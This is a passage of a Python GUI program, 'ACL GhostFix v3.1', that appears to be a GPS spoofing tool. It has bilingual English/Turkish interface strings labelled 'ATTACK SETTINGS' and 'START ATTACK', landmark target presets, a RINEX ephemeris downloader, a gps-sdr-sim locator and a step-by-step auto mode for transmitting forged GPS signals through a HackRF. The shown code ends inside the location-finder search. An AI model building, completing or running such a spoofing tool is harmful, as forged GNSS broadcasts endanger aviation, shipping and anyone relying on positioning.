#!/usr/bin/env python3
"""
ACL GhostFix v3.1
ACL Labs — Defense & Security Technologies
pip install customtkinter pillow requests
"""

import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog
import threading, requests, gzip, shutil
import os, json, datetime, subprocess, time, re, ftplib, urllib.request, urllib.error
from PIL import Image, ImageDraw, ImageTk

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

WORK_DIR     = r"C:\ACL-GhostFix"
RINEX_DIR    = os.path.join(WORK_DIR, "rinex")
BIN_DIR      = os.path.join(WORK_DIR, "bin")
GPS_SIM_EXE  = os.path.join(WORK_DIR, "gps-sdr-sim.exe")   # fallback default; auto-discovered at runtime
CONFIG_FILE  = os.path.join(WORK_DIR, "acl_config.json")

C = {
    "bg":       "#020810",
    "panel":    "#040D1A",
    "card":     "#061020",
    "border":   "#0A2040",
    "neon":     "#00CFFF",
    "neon2":    "#0090CC",
    "neon_dim": "#004466",
    "green":    "#00FF88",
    "red":      "#FF2244",
    "orange":   "#FF6600",
    "yellow":   "#FFD600",
    "gray":     "#3A6080",
    "gray2":    "#1A3050",
    "white":    "#C8E8FF",
    "dim":      "#0A1828",
    "dark":     "#010609",
}

PRESETS = {
    "🇹🇷  Istanbul — Taksim":    (41.0082,  28.9784,  50),
    "🇹🇷  Ankara — Kizilay":     (39.9334,  32.8597, 890),
    "🇹🇷  Izmir — Konak":        (38.4189,  27.1287,  30),
    "🇹🇷  Antalya":              (36.8841,  30.7056,  50),
    "🇺🇸  New York":             (40.7128, -74.0060,  10),
    "🇫🇷  Paris — Eiffel":       (48.8584,   2.2945,  50),
    "🇬🇧  London — Big Ben":     (51.5007,  -0.1246,  20),
    "🇯🇵  Tokyo — Shibuya":      (35.6595, 139.7004,  40),
    "🇦🇪  Dubai — Burj Khalifa": (25.1972,  55.2744,  50),
    "🇷🇺  Moscow — Kremlin":     (55.7520,  37.6175, 150),
    "🇨🇳  Beijing — Forbidden City": (39.9163, 116.3972, 50),
    "🇧🇷  Rio — Christ Redeemer": (-22.9519,-43.2105, 710),
}

# ─────────────────────────────────────────────────────────────────────────────
# LANGUAGE STRINGS
# ─────────────────────────────────────────────────────────────────────────────
LANG = {
    "en": {
        "app_title":        "ACL GhostFix",
        "app_subtitle":     "ACL Labs  ·  Defense & Security Technologies  ·  v3.1",
        "header_label":     "⬡  ACL GHOSTFIX",
        "btn_settings":     "⚙  Settings",
        "btn_check":        "🔍  Check Deps",
        "btn_opendir":      "📁  Open Dir",
        "sec_location":     "📍  TARGET LOCATION",
        "btn_smart_loc":    "🎯  Smart Location Finder  →",
        "smart_loc_hint":   "City/place name  ·  Google Maps link  ·  or enter coordinates",
        "lbl_quick_preset": "Quick Preset",
        "lbl_lat":          "Latitude (°)",
        "lbl_lon":          "Longitude (°)",
        "lbl_alt":          "Altitude (m)",
        "sec_rinex":        "🛰  RINEX FILE",
        "radio_auto":       "Auto download  (NASA CDDIS / IGS Mirror / FTP)",
        "radio_manual":     "Select local file",
        "lbl_earthdata":    "Earthdata: ",
        "lbl_earthdata_na": "(not set)",
        "sec_attack":       "⚡  ATTACK SETTINGS",
        "lbl_gain":         "TX Gain",
        "lbl_duration":     "Duration (s)",
        "lbl_amp":          "TX Amplifier ON",
        "sec_control":      "🚀  CONTROL",
        "btn_rinex":        "1  ·  DOWNLOAD / SELECT RINEX",
        "btn_bin":          "2  ·  GENERATE .BIN FILE",
        "btn_attack":       "3  ·  START ATTACK  📡",
        "btn_stop":         "⏹  STOP",
        "btn_auto":         "⚡  AUTO  ( 1 → 2 → 3 )",
        "status_ready":     "● Ready",
        "terminal_label":   "📟  TERMINAL",
        "btn_clear":        "🗑  Clear",
        # SmartLocationFinder
        "slf_title":        "ACL GhostFix  —  Smart Location Finder",
        "slf_header":       "🎯  SMART LOCATION FINDER",
        "slf_hint":         "City name  |  Google Maps link",
        "sec_city_search":  "🔍  SEARCH BY CITY / PLACE NAME  (Nominatim)",
        "slf_desc":         "Enter any city, district, landmark or address:",
        "slf_placeholder":  "e.g: Galata Tower, Tokyo, Times Square...",
        "btn_search":       "🔍  SEARCH",
        "slf_searching":    "⏳  Searching...",
        "slf_no_result":    "No results found. Try a different name.",
        "sec_gmap":         "🗺  PASTE GOOGLE MAPS LINK",
        "gmap_desc":        "Paste a Google Maps link to extract coordinates automatically:",
        "gmap_placeholder": "https://maps.google.com/?q=...  or  https://goo.gl/maps/...",
        "btn_extract":      "📍  EXTRACT",
        "coord_label":      "SELECTED:",
        "coord_none":       "—  not selected yet  —",
        "btn_use_loc":      "✓  Use This Location",
        "btn_close":        "✕  Close",
        "coord_err":        "✗  Coordinates not found — @lat,lon format required",
        "coord_warn":       "⚠  Select a location first!",
        # Settings
        "settings_title":   "Settings",
        "settings_header":  "⚙  SETTINGS",
        "sec_earthdata":    "NASA EARTHDATA ACCOUNT",
        "earthdata_hint":   "For RINEX download → urs.earthdata.nasa.gov  (free)",
        "lbl_username":     "Username",
        "lbl_password":     "Password",
        "sec_workdir":      "WORKING DIRECTORY",
        "lbl_folder":       "Folder Path",
        "sec_gpssim":       "GPS-SDR-SIM EXE",
        "gpssim_hint":      "github.com/osqzss/gps-sdr-sim — build from source (see README), repo is archived, no .exe in Releases",
        "lbl_gpssim_path":  "gps-sdr-sim.exe Path",
        "sec_language":     "LANGUAGE",
        "lbl_language":     "Interface Language",
        "btn_save":         "✓  Save & Close",
        # Logs
        "log_started":      "ACL GhostFix v3.1 started",
        "log_workdir":      "Working directory: ",
        "log_checking":     "Checking dependencies...",
        "log_sim_found":    "✓  gps-sdr-sim.exe found",
        "log_sim_missing":  "✗  gps-sdr-sim.exe not found: ",
        "log_sim_dl":       "   → Build it yourself: see README 'Building gps-sdr-sim.exe' section",
        "log_hackrf_ok":    "✓  HackRF connected and ready",
        "log_hackrf_no":    "✗  HackRF not found — check USB",
        "log_hackrf_err":   "✗  hackrf_info error: ",
        "log_ed_set":       "Earthdata: ",
        "log_ed_na":        "not set",
        "log_rinex_step":   "STEP 1: Downloading RINEX",
        "log_rinex_exists": "✓  Already exists: ",
        "log_rinex_dl_ok":  "✓  Downloaded: ",
        "log_rinex_ready":  "RINEX ready",
        "log_rinex_fail":   "RINEX download failed",
        "log_rinex_manual": "Select manually or enter Earthdata credentials in Settings",
        "log_rinex_old":    "⚠  Using existing: ",
        "log_rinex_manual_ok": "Using manual RINEX: ",
        "log_rinex_pick":   "✗  Select a file first!",
        "log_bin_step":     "STEP 2: Generating GPS Signal File",
        "log_bin_ok":       "✓  Generated: ",
        "log_bin_fail":     "✗  .bin generation failed",
        "log_bin_coord_err":"✗  Invalid coordinates!",
        "log_bin_no_rinex": "✗  Download/select RINEX first!",
        "log_bin_missing":  "✗  gps-sdr-sim.exe not found: ",
        "log_atk_step":     "STEP 3: Transmitting GPS Signal 📡",
        "log_atk_done":     "Attack ended.",
        "log_atk_stopped":  "⏹  Stopped.",
        "log_atk_no_bin":   "✗  Generate .bin first!",
        "log_hackrf_tr_no": "✗  hackrf_transfer not found!",
        "log_auto_start":   "AUTO MODE  ( 1 → 2 → 3 )",
        "log_auto_no_rinex":"✗  Stop: no RINEX",
        "log_auto_no_bin":  "✗  Stop: no .bin",
        "status_rinex_dl":  "Downloading RINEX...",
        "status_bin":       ".bin generating...",
        "status_attack":    "ATTACK ACTIVE ⚡",
        "status_stopped":   "Stopped",
        "status_rinex_ok":  "RINEX ready",
        "status_bin_ok":    ".bin ready",
        "status_error":     "Error",
        "settings_saved":   "Settings saved.",
        "preset_loaded":    "Preset loaded: ",
        "loc_selected":     "Location selected: ",
    },
    "tr": {
        "app_title":        "ACL GhostFix",
        "app_subtitle":     "ACL Labs  ·  Savunma & Güvenlik Teknolojileri  ·  v3.1",
        "header_label":     "⬡  ACL GHOSTFIX",
        "btn_settings":     "⚙  Ayarlar",
        "btn_check":        "🔍  Bağlantı Kontrol",
        "btn_opendir":      "📁  Dizin Aç",
        "sec_location":     "📍  HEDEF KONUM",
        "btn_smart_loc":    "🎯  Akıllı Konum Bulucu  →",
        "smart_loc_hint":   "Şehir/mekan adı  ·  Google Maps linki  ·  veya koordinat gir",
        "lbl_quick_preset": "Hızlı Profil",
        "lbl_lat":          "Enlem (°)",
        "lbl_lon":          "Boylam (°)",
        "lbl_alt":          "Yükseklik (m)",
        "sec_rinex":        "🛰  RINEX DOSYASI",
        "radio_auto":       "Otomatik indir  (NASA CDDIS / IGS Mirror / FTP)",
        "radio_manual":     "Yerel dosya seç",
        "lbl_earthdata":    "Earthdata: ",
        "lbl_earthdata_na": "(ayarlanmadı)",
        "sec_attack":       "⚡  SALDIRI AYARLARI",
        "lbl_gain":         "TX Gain",
        "lbl_duration":     "Süre (sn)",
        "lbl_amp":          "TX Amplifier ON",
        "sec_control":      "🚀  KONTROL",
        "btn_rinex":        "1  ·  RINEX İNDİR / SEÇ",
        "btn_bin":          "2  ·  .BIN DOSYASI ÜRET",
        "btn_attack":       "3  ·  SALDIRILARI BAŞLAT  📡",
        "btn_stop":         "⏹  DURDUR",
        "btn_auto":         "⚡  OTOMATİK  ( 1 → 2 → 3 )",
        "status_ready":     "● Hazır",
        "terminal_label":   "📟  TERMINAL",
        "btn_clear":        "🗑  Temizle",
        "slf_title":        "ACL GhostFix  —  Akıllı Konum Bulucu",
        "slf_header":       "🎯  AKİLLI KONUM BULUCU",
        "slf_hint":         "Şehir adı  |  Google Maps linki",
        "sec_city_search":  "🔍  ŞEHİR / MEKAN ADI ile ARA  (Nominatim)",
        "slf_desc":         "Herhangi bir şehir, semt, mekan, adres girebilirsiniz:",
        "slf_placeholder":  "örn: Galata Kulesi, Tokyo, Times Square...",
        "btn_search":       "🔍  ARA",
        "slf_searching":    "⏳  Aranıyor...",
        "slf_no_result":    "Sonuç bulunamadı. Farklı bir isim dene.",
        "sec_gmap":         "🗺  GOOGLE MAPS LİNKİ YAPIŞTI",
        "gmap_desc":        "Google Maps'ten kopyaladığın linki yapıştır, koordinatı otomatik çeksin:",
        "gmap_placeholder": "https://maps.google.com/?q=...  veya  https://goo.gl/maps/...",
        "btn_extract":      "📍  ÇEK",
        "coord_label":      "SEÇİLİ KONUM:",
        "coord_none":       "—  henüz seçilmedi  —",
        "btn_use_loc":      "✓  Bu Konumu Kullan",
        "btn_close":        "✕  Kapat",
        "coord_err":        "✗  Koordinat bulunamadı — @lat,lon formatı gerekli",
        "coord_warn":       "⚠  Önce bir konum seç!",
        "settings_title":   "Ayarlar",
        "settings_header":  "⚙  AYARLAR",
        "sec_earthdata":    "NASA EARTHDATA HESABI",
        "earthdata_hint":   "RINEX indirme için → urs.earthdata.nasa.gov  (ücretsiz)",
        "lbl_username":     "Kullanıcı Adı",
        "lbl_password":     "Şifre",
        "sec_workdir":      "ÇALIŞMA DİZİNİ",
        "lbl_folder":       "Klasör Yolu",
        "sec_gpssim":       "GPS-SDR-SIM EXE",
        "gpssim_hint":      "github.com/osqzss/gps-sdr-sim — kaynak koddan derle (README'ye bak), repo arşivlenmiş, Releases'ta .exe yok",
        "lbl_gpssim_path":  "gps-sdr-sim.exe Yolu",
        "sec_language":     "DİL",
        "lbl_language":     "Arayüz Dili",
        "btn_save":         "✓  Kaydet ve Kapat",
        "log_started":      "ACL GhostFix v3.1 başlatıldı",
        "log_workdir":      "Çalışma dizini: ",
        "log_checking":     "Bağımlılıklar kontrol ediliyor...",
        "log_sim_found":    "✓  gps-sdr-sim.exe bulundu",
        "log_sim_missing":  "✗  gps-sdr-sim.exe bulunamadı: ",
        "log_sim_dl":       "   → Kendin derle: README'deki 'Building gps-sdr-sim.exe' bölümüne bak",
        "log_hackrf_ok":    "✓  HackRF bağlı ve hazır",
        "log_hackrf_no":    "✗  HackRF bulunamadı — USB kontrol et",
        "log_hackrf_err":   "✗  hackrf_info hatası: ",
        "log_ed_set":       "Earthdata: ",
        "log_ed_na":        "ayarlanmamış",
        "log_rinex_step":   "ADIM 1: RINEX İndiriliyor",
        "log_rinex_exists": "✓  Zaten mevcut: ",
        "log_rinex_dl_ok":  "✓  İndirildi: ",
        "log_rinex_ready":  "RINEX hazır",
        "log_rinex_fail":   "RINEX indirme başarısız",
        "log_rinex_manual": "Manuel seç veya Earthdata hesabını Ayarlar'dan gir",
        "log_rinex_old":    "⚠  Mevcut kullanılıyor: ",
        "log_rinex_manual_ok": "Manuel RINEX kullanılıyor: ",
        "log_rinex_pick":   "✗  Dosya seçin!",
        "log_bin_step":     "ADIM 2: GPS Sinyal Dosyası Üretiliyor",
        "log_bin_ok":       "✓  Üretildi: ",
        "log_bin_fail":     "✗  .bin üretilemedi",
        "log_bin_coord_err":"✗  Geçersiz koordinat!",
        "log_bin_no_rinex": "✗  Önce RINEX indir/seç!",
        "log_bin_missing":  "✗  gps-sdr-sim.exe bulunamadı: ",
        "log_atk_step":     "ADIM 3: GPS Sinyali Gönderiliyor 📡",
        "log_atk_done":     "Saldırı sona erdi.",
        "log_atk_stopped":  "⏹  Durduruldu.",
        "log_atk_no_bin":   "✗  Önce .bin üret!",
        "log_hackrf_tr_no": "✗  hackrf_transfer bulunamadı!",
        "log_auto_start":   "OTOMATİK MOD  ( 1 → 2 → 3 )",
        "log_auto_no_rinex":"✗  Dur: RINEX yok",
        "log_auto_no_bin":  "✗  Dur: .bin yok",
        "status_rinex_dl":  "RINEX indiriliyor...",
        "status_bin":       ".bin üretiliyor...",
        "status_attack":    "SALDIRI AKTİF ⚡",
        "status_stopped":   "Durduruldu",
        "status_rinex_ok":  "RINEX hazır",
        "status_bin_ok":    ".bin hazır",
        "status_error":     "Hata",
        "settings_saved":   "Ayarlar kaydedildi.",
        "preset_loaded":    "Profil yüklendi: ",
        "loc_selected":     "Konum seçildi: ",
    }
}

def t(key, lang="en"):
    """Get translation string."""
    return LANG.get(lang, LANG["en"]).get(key, LANG["en"].get(key, key))


def find_gps_sdr_sim(log_cb=None):
    """
    Auto-discover gps-sdr-sim.exe on the system.
    Search priority (fast → slow):
      1. WORK_DIR (C:\\ACL-GhostFix)
      2. Common install/download locations
      3. Limited-depth scan of all fixed drives (C:, D:, EiF: ...)
    Returns full path if found, else None.
    """
    candidates = [
        os.path.join(WORK_DIR, "gps-sdr-sim.exe"),
        r"C:\gps-sdr-sim\gps-sdr-sim.exe",
        r"C:\Program Files\gps-sdr-sim\gps-sdr-sim.exe",
        r"C:\Program Files (x86)\gps-sdr-sim\gps-sdr-sim.exe",
        r"C:\gnss_data\gps-sdr-sim.exe",                       # old default, backward-compat
        os.path.join(os.path.expanduser("~"), "Downloads", "gps-sdr-sim.exe"),
        os.path.join(os.path.expanduser("~"), "Desktop", "gps-sdr-sim.exe"),
    ]
    for c in candidates:
        if os.path.exists(c):
            if log_cb: log_cb(f"✓  gps-sdr-sim.exe found: {c}", C["green"])
            return c

    if log_cb: log_cb("Scanning drives for gps-sdr-sim.exe (this can take a moment)...", C["gray"])

    # Limited-depth scan across fixed drives. We cap depth to avoid
    # multi-minute scans of huge disks.
    import string
    MAX_DEPTH = 4
    SKIP_DIRS = {"windows", "$recycle.bin", "system volume information",
                 "programdata", "node_modules", ".git", "appdata"}

    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if not os.path.exists(drive):
            continue
        base_depth = drive.rstrip("\\").count(os.sep)
        try:
            for root, dirs, files in os.walk(drive):
                depth = root.count(os.sep) - base_depth
                if depth >= MAX_DEPTH:
                    dirs[:] = []
                    continue
                dirs[:] = [d for d in dirs if d.lower() not in SKIP_DIRS]
                if "gps-sdr-sim.exe" in files:
                    found = os.path.join(root, "gps-sdr-sim.exe")
                    if log_cb: log_cb(f"✓  gps-sdr-sim.exe found: {found}", C["green"])
                    return found
        except (PermissionError, OSError):
            continue

    if log_cb: log_cb("✗  gps-sdr-sim.exe not found anywhere on disk.", C["yellow"])
    return None


def load_config():
    os.makedirs(RINEX_DIR, exist_ok=True)
    os.makedirs(BIN_DIR, exist_ok=True)
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f: return json.load(f)
        except: pass
    # First run: create the default config AND persist it immediately,
    # so the file exists on disk right away instead of only after the
    # user opens Settings and clicks Save.
    default_cfg = {"earthdata_user": "", "earthdata_pass": "",
            "work_dir": WORK_DIR, "rinex_dir": RINEX_DIR, "bin_dir": BIN_DIR,
            "gpssim_path": "", "gpssim_autodetected": False,
            "language": "en"}
    save_config(default_cfg)
    return default_cfg

def save_config(cfg):
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, "w") as f: json.dump(cfg, f, indent=2)

def center_window(win, w, h):
    win.update_idletasks()
    sw = win.winfo_screenwidth()
    sh = win.winfo_screenheight()
    x = (sw - w) // 2
    y = (sh - h) // 2
    win.geometry(f"{w}x{h}+{x}+{y}")


# ─────────────────────────────────────────────────────────────────────────────
# RINEX DOWNLOADER — Multi-source with FTP fallback
# ─────────────────────────────────────────────────────────────────────────────
class _EarthdataSession(requests.Session):
    """
    requests.Session subclass that correctly handles the CDDIS -> Earthdata Login
    (URS) -> CDDIS redirect dance.

    CDDIS does NOT accept a simple "Bearer token from /oauth/token" call the way
    some other NASA DAACs do. Instead, the standard flow is:
      1. GET the CDDIS URL
      2. CDDIS redirects (302) to urs.earthdata.nasa.gov for login
      3. We must supply HTTP Basic Auth credentials ONLY on the urs.earthdata.nasa.gov
         leg of the redirect chain (sending them to the original/final host would be
         rejected, and `requests` strips Authorization headers on cross-host redirects
         for security -- which is actually what we want here).
      4. URS authenticates and redirects back to CDDIS with a session cookie
      5. CDDIS serves the actual file using that cookie

    This mirrors what curl --netrc / -L does, and is documented by NASA here:
    https://urs.earthdata.nasa.gov/documentation/for_users/data_access/python
    """
    AUTH_HOST = "urs.earthdata.nasa.gov"

    def __init__(self, username, password):
        super().__init__()
        self._auth = (username, password)

    def rebuild_auth(self, prepared_request, response):
        # Default requests behavior strips Authorization headers when redirecting
        # to a different host. We instead WANT to attach Basic Auth specifically
        # when redirected to the Earthdata Login host, and let it be removed
        # everywhere else (which the default super() call already does for us).
        super().rebuild_auth(prepared_request, response)
        url_host = requests.utils.urlparse(prepared_request.url).hostname or ""
        if url_host == self.AUTH_HOST:
            prepared_request.prepare_auth(self._auth)


def _try_http_source(label, url, out_path, log_cb, session=None, timeout=30):
    """Download `url` to `out_path` (gzip), validating it's actually gzip data."""
    try:
        getter = session.get if session else requests.get
        r = getter(url, stream=True, timeout=timeout, allow_redirects=True,
                    headers={"User-Agent": "ACL-GhostFix/3.1"})

        # IMPORTANT: create ONE iterator and reuse it for both the peek and
        # the rest of the download. Calling r.iter_content() a second time
        # on the same response creates a second generator over the same
        # underlying stream, which can silently drop/duplicate bytes and
        # produce a truncated gzip ("ended before end-of-stream marker").
        content_iter = r.iter_content(8192)
        first_chunk = next(content_iter, b"")
        is_gz = first_chunk[:2] == b'\x1f\x8b'

        if r.status_code == 200 and is_gz:
            with open(out_path, "wb") as f:
                f.write(first_chunk)
                for ch in content_iter:
                    f.write(ch)
            return True
        elif r.status_code == 200 and not is_gz:
            log_cb(f"  {label}: HTTP 200 but not gzip data (likely a login/HTML page) — skipping", C["yellow"])
        else:
            log_cb(f"  {label}: HTTP {r.status_code}", C["yellow"])
    except Exception as e:
        log_cb(f"  {label} error: {e}", C["yellow"])
    return False


def download_rinex(rinex_dir, earthdata_user, earthdata_pass, log_cb, lang="en"):
    """
    Try multiple sources for RINEX broadcast navigation file.
    Returns path to local file on success, None on failure.
    Sources tried in order:
      1. NASA CDDIS HTTPS via proper Earthdata Login session/cookie redirect
      2. BKG IGS Mirror HTTPS (no auth required)
      3. NASA CDDIS FTPS (explicit TLS — CDDIS no longer allows plain anonymous FTP)
      4. GAGE/UNAVCO HTTPS mirror
    """
    os.makedirs(rinex_dir, exist_ok=True)
    today = datetime.date.today()
    doy = today.timetuple().tm_yday
    yr2 = str(today.year)[-2:]
    yr4 = today.year
    fn = f"brdc{doy:03d}0.{yr2}n"
    out = os.path.join(rinex_dir, fn)
    gz  = out + ".gz"

    if os.path.exists(out):
        log_cb(f"{t('log_rinex_exists', lang)}{fn}", C["green"])
        return out

    log_cb(f"Target file: {fn}", C["gray"])

    # ── Source 1: NASA CDDIS HTTPS (proper Earthdata Login session) ────────
    cddis_url = (f"https://cddis.nasa.gov/archive/gnss/data/daily/"
                 f"{yr4}/{doy:03d}/{yr2}n/{fn}.gz")
    log_cb(f"[1/4] NASA CDDIS HTTPS: {cddis_url}", C["gray"])

    if earthdata_user and earthdata_pass:
        try:
            sess = _EarthdataSession(earthdata_user, earthdata_pass)
            if _try_http_source("NASA CDDIS", cddis_url, gz, log_cb, session=sess):
                with gzip.open(gz, "rb") as fi, open(out, "wb") as fo:
                    shutil.copyfileobj(fi, fo)
                os.remove(gz)
                log_cb(f"{t('log_rinex_dl_ok', lang)}{fn}  (NASA CDDIS)  →  {out}", C["green"])
                return out
        except Exception as e:
            err = str(e)
            if "getaddrinfo failed" in err or "NameResolutionError" in err:
                log_cb("  NASA CDDIS: DNS resolution failed reaching urs.earthdata.nasa.gov "
                       "(temporary network/DNS issue, not a credential problem) — trying next source",
                       C["yellow"])
            else:
                log_cb(f"  NASA CDDIS HTTPS error: {err}", C["yellow"])
    else:
        log_cb("  Skipped — no Earthdata credentials configured (Settings → NASA Earthdata Account)", C["yellow"])

    # ── Source 2: BKG IGS Mirror HTTPS (no auth) ────────────────────────────
    bkg_url = (f"https://igs.bkg.bund.de/root_ftp/IGS/BRDC/"
               f"{yr4}/{doy:03d}/{fn}.gz")
    log_cb(f"[2/4] BKG IGS Mirror: {bkg_url}", C["gray"])
    if _try_http_source("BKG IGS", bkg_url, gz, log_cb):
        try:
            with gzip.open(gz, "rb") as fi, open(out, "wb") as fo:
                shutil.copyfileobj(fi, fo)
            os.remove(gz)
            log_cb(f"{t('log_rinex_dl_ok', lang)}{fn}  (BKG IGS)  →  {out}", C["green"])
            return out
        except Exception as e:
            log_cb(f"  BKG IGS extract error: {e}", C["yellow"])

    # ── Source 3: NASA CDDIS FTPS (explicit TLS — plain FTP is rejected) ───
    ftp_host = "gdc.cddis.eosdis.nasa.gov"
    ftp_path = f"/gnss/data/daily/{yr4}/{doy:03d}/{yr2}n/{fn}.gz"
    log_cb(f"[3/4] NASA CDDIS FTPS: {ftp_host}{ftp_path}", C["gray"])
    try:
        with ftplib.FTP_TLS(ftp_host, timeout=30) as ftps:
            ftps.login()             # anonymous, but over TLS
            ftps.prot_p()            # secure the data channel too
            with open(gz, "wb") as f:
                ftps.retrbinary(f"RETR {ftp_path}", f.write)
        with gzip.open(gz, "rb") as fi, open(out, "wb") as fo:
            shutil.copyfileobj(fi, fo)
        os.remove(gz)
        log_cb(f"{t('log_rinex_dl_ok', lang)}{fn}  (CDDIS FTPS)  →  {out}", C["green"])
        return out
    except Exception as e:
        log_cb(f"  CDDIS FTPS error: {e}", C["yellow"])

    # ── Source 4: GAGE/UNAVCO HTTPS mirror ──────────────────────────────────
    gage_url = (f"https://data.unavco.org/archive/gnss/rinex/nav/"
                f"{yr4}/{doy:03d}/{fn}.gz")
    log_cb(f"[4/4] GAGE/UNAVCO: {gage_url}", C["gray"])
    if _try_http_source("GAGE/UNAVCO", gage_url, gz, log_cb):
        try:
            with gzip.open(gz, "rb") as fi, open(out, "wb") as fo:
                shutil.copyfileobj(fi, fo)
            os.remove(gz)
            log_cb(f"{t('log_rinex_dl_ok', lang)}{fn}  (GAGE/UNAVCO)  →  {out}", C["green"])
            return out
        except Exception as e:
            log_cb(f"  GAGE/UNAVCO extract error: {e}", C["yellow"])

    return None


# ─────────────────────────────────────────────────────────────────────────────
# AKILLI KONUM BULUCU / SMART LOCATION FINDER
# ─────────────────────────────────────────────────────────────────────────────
class SmartLocationFinder(ctk.CTkToplevel):
    def __init__(self, parent, on_select, lang="en"):
        super().__init__(parent)
        self.lang = lang
        self.title(t("slf_title", lang))
        self.configure(fg_color=C["bg"])
        self.resizable(False, False)
        self.grab_set()
        self.parent = parent
        self.on_select = on_select
        self.found_lat = None
        self.found_lon = None

        center_window(self, 640, 680)

        ctk.CTkFrame(self, fg_color=C["neon"], height=3, corner_radius=0).pack(fill="x")
        hdr = ctk.CTkFrame(self, fg_color=C["panel"], height=56, corner_radius=0)
        hdr.pack(fill="x"); hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text=t("slf_header", lang),
                     font=parent.FONT_TITLE, text_color=C["neon"]).pack(side="left", padx=20, pady=14)
        ctk.CTkLabel(hdr, text=t("slf_hint", lang),
                     font=parent.FONT_TINY, text_color=C["gray"]).pack(side="left")

        scroll = ctk.CTkScrollableFrame(self, fg_color="transparent",
                                         scrollbar_button_color=C["neon_dim"],
                                         scrollbar_button_hover_color=C["neon"])
        scroll.pack(fill="both", expand=True, padx=20, pady=(12,0))

        self._section(scroll, t("sec_city_search", lang))

        search_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=12)
        search_card.pack(fill="x", pady=(0,14))

        ctk.CTkLabel(search_card, text=t("slf_desc", lang),
            font=parent.FONT_SMALL, text_color=C["gray"]
        ).pack(anchor="w", padx=16, pady=(14,6))

        sr = ctk.CTkFrame(search_card, fg_color="transparent")
        sr.pack(fill="x", padx=16, pady=(0,10))

        self.search_var = ctk.StringVar()
        self.search_entry = ctk.CTkEntry(
            sr, textvariable=self.search_var,
            placeholder_text=t("slf_placeholder", lang),
            font=parent.FONT_MONO_SM,
            fg_color=C["dark"], border_color=C["neon"],
            text_color=C["white"], corner_radius=8, height=42,
            border_width=2
        )
        self.search_entry.pack(side="left", fill="x", expand=True, padx=(0,10))
        self.search_entry.bind("<Return>", lambda e: self._do_search())

        ctk.CTkButton(sr, text=t("btn_search", lang), width=110, height=42,
                      fg_color=C["neon"], text_color=C["bg"],
                      hover_color=C["green"],
                      font=parent.FONT_NORMAL, corner_radius=8,
                      command=self._do_search).pack(side="left")

        self.result_frame = ctk.CTkScrollableFrame(
            search_card, fg_color=C["dark"], corner_radius=8, height=150,
            scrollbar_button_color=C["neon_dim"],
            scrollbar_button_hover_color=C["neon"]
        )
        self.result_frame.pack(fill="x", padx=16, pady=(0,14))

        self.result_widgets = []
        self._show_placeholder(t("slf_no_result", lang).replace("No results found. Try a different name.", "Type above and press SEARCH.") if lang=="en" else "Arama yapmak için yukarıya yaz ve ARA'ya bas.")

        self._section(scroll, t("sec_gmap", lang))

        gmap_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=12)
        gmap_card.pack(fill="x", pady=(0,14))

        ctk.CTkLabel(gmap_card, text=t("gmap_desc", lang),
            font=parent.FONT_SMALL, text_color=C["gray"]
        ).pack(anchor="w", padx=16, pady=(14,6))

        gr = ctk.CTkFrame(gmap_card, fg_color="transparent")
        gr.pack(fill="x", padx=16, pady=(0,14))

        self.gmap_var = ctk.StringVar()
        ctk.CTkEntry(
            gr, textvariable=self.gmap_var,
            placeholder_text=t("gmap_placeholder", lang),
            font=parent.FONT_MONO_SM,
            fg_color=C["dark"], border_color=C["neon2"],
            text_color=C["white"], corner_radius=8, height=42,
            border_width=2
        ).pack(side="left", fill="x", expand=True, padx=(0,10))

        ctk.CTkButton(gr, text=t("btn_extract", lang), width=110, height=42,
                      fg_color=C["neon2"], text_color=C["bg"],
                      hover_color=C["green"],
                      font=parent.FONT_NORMAL, corner_radius=8,
                      command=self._parse_gmap).pack(side="left")

        coord_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=12)
        coord_card.pack(fill="x", pady=(0,8))

        cr = ctk.CTkFrame(coord_card, fg_color="transparent")
        cr.pack(fill="x", padx=16, pady=14)

        ctk.CTkLabel(cr, text=t("coord_label", lang),
                     font=parent.FONT_NORMAL, text_color=C["gray"]).pack(side="left")

        self.coord_lbl = ctk.CTkLabel(cr,
            text=t("coord_none", lang),
            font=ctk.CTkFont(family="Courier", size=13, weight="bold"),
            text_color=C["neon"])
        self.coord_lbl.pack(side="left", padx=14)

        sep = ctk.CTkFrame(self, fg_color=C["neon_dim"], height=1, corner_radius=0)
        sep.pack(fill="x")

        bf = ctk.CTkFrame(self, fg_color=C["panel"], corner_radius=0)
        bf.pack(fill="x", side="bottom")

        ctk.CTkButton(bf, text=t("btn_use_loc", lang), width=220, height=48,
                      fg_color=C["neon"], text_color=C["bg"],
                      hover_color=C["green"],
                      border_color=C["neon"], border_width=2,
                      font=ctk.CTkFont(size=13, weight="bold"),
                      corner_radius=10,
                      command=self._confirm).pack(side="left", padx=16, pady=14)

        ctk.CTkButton(bf, text=t("btn_close", lang), width=130, height=48,
                      fg_color=C["card"], text_color=C["white"],
                      hover_color=C["border"], corner_radius=10,
                      font=parent.FONT_NORMAL,
                      command=self.destroy).pack(side="left", padx=(0,16), pady=14)

        self.search_entry.focus()

    def _section(self, parent_f, title):
        f = ctk.CTkFrame(parent_f, fg_color="transparent")
        f.pack(fill="x", pady=(0,8))
        ctk.CTkLabel(f, text=title, font=self.parent.FONT_NORMAL,
                     text_color=C["neon"]).pack(side="left")
        ctk.CTkFrame(f, fg_color=C["neon_dim"], height=1,
                     corner_radius=0).pack(side="left", fill="x", expand=True, padx=(10,0))

    def _show_placeholder(self, msg, color=None):
        for w in self.result_widgets:
            w.destroy()
        self.result_widgets.clear()
        lbl = ctk.CTkLabel(self.result_frame, text=msg,
                           font=self.parent.FONT_TINY, text_color=color or C["gray"])
        lbl.pack(anchor="w", padx=10, pady=8)
        self.result_widgets.append(lbl)

    def _set_result(self, lat, lon, label=""):
        self.found_lat = lat
        self.found_lon = lon
        self.coord_lbl.configure(
            text=f"📍  {lat:.4f}°  {lon:.4f}°  {label}",
            text_color=C["green"]
        )

    def _do_search(self):
        q = self.search_var.get().strip()
        if not q: return
        for w in self.result_widgets:
            w.destroy()
        self.result_widgets.clear()
